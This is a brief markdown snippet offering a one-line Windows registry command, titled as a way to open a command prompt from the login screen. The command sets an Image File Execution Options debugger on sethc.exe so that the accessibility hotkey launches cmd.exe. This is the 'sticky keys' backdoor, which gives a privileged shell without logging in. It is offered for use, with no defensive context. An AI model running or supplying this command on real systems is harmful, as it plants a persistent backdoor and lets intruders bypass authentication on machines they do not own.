## Windows script to launch command prompt from login screen

```sh
REM alt + shift + print_screen
cmd.exe /c "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f"
```
